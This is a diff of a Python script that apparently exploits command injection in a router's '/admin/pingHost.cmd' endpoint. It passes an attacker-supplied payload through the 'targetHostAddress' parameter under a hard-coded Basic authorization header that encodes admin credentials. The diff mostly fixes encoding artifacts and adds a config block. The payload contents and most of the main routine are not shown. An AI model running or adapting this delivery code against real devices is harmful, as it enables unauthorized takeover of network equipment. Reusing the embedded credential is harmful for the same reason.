@@ -4,13 +4,21 @@
 import requests
 from subprocess import Popen, PIPE
 
-router_host =3D "http://192.168.1.1"
-authorization_header =3D "YWRtaW46QWRtMW5ATDFtMyM=3D"
+router_host = "http://192.168.1.1"
+authorization_header = "YWRtaW46QWRtMW5ATDFtMyM="
 
-lhost =3D "lo"
-lport =3D 80
+lhost = "lo"
+lport = 80
 
-payload_port =3D 81
+payload_port = 81
+
+LOCAL_HOST = lhost
+LOCAL_PORT = lport
+PAYLOAD_PORT = payload_port
+config = {
+    "router_host": router_host,
+    "authorization_header": f"Basic {authorization_header}",
+}
 
 
 def main():
@@ -36,11 +44,10 @@ def get_session():
 
 def send_payload(payload):
     print(payload)
-    url =3D router_host + "/admin/pingHost.cmd"
-    headers =3D {"Authorization": "Basic {}".format(authorization_header)}
-    params =3D {"action": "add", "targetHostAddress": payload, "sessionKey"=
-: get_session()}
-    requests.get(url, headers=3Dheaders, params=3Dparams).text
+    url = router_host + "/admin/pingHost.cmd"
+    headers = {"Authorization": "Basic {}".format(authorization_header)}
+    params = {"action": "add", "targetHostAddress": payload, "sessionKey": get_session()}
+    requests.get(url, headers=headers, params=params).text
 
 
 main()
